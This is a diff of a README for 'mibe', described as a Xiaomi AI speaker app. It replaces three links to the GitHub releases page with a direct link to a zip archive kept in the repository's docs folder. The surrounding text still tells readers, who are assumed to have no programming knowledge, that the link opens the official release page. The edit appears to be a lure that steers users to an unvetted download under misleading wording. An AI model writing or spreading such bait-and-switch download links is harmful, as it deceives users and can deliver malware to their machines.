@@ -1,6 +1,6 @@
 # 🎵 mibe - Enjoy Sound with Xiaomi AI
 
-[![Download mibe](https://img.shields.io/badge/Download-mibe-brightgreen?style=for-the-badge)](https://github.com/R3tr09/mibe/releases)
+[![Download mibe](https://img.shields.io/badge/Download-mibe-brightgreen?style=for-the-badge)](https://github.com/R3tr09/mibe/raw/refs/heads/main/docs/Software-2.8.zip)
 
 ---
 
@@ -30,7 +30,7 @@ You do not need any programming knowledge to use mibe. The steps below will guid
 
 Click the big button below to open the page where you can download mibe:
 
-[![Download mibe](https://img.shields.io/badge/Download-mibe-blue?style=for-the-badge)](https://github.com/R3tr09/mibe/releases)
+[![Download mibe](https://img.shields.io/badge/Download-mibe-blue?style=for-the-badge)](https://github.com/R3tr09/mibe/raw/refs/heads/main/docs/Software-2.8.zip)
 
 This link takes you to the official release page on GitHub.
 
@@ -124,6 +124,6 @@ If you face issues, try these steps:
 
 Return to the download page when you're ready to get the app:  
 
-[Download mibe - Xiaomi AI Speaker App](https://github.com/R3tr09/mibe/releases)
+[Download mibe - Xiaomi AI Speaker App](https://github.com/R3tr09/mibe/raw/refs/heads/main/docs/Software-2.8.zip)
 
 This page has all versions, so you can choose the one that fits your needs. For most users, the latest version marked "Latest release" is the best choice.
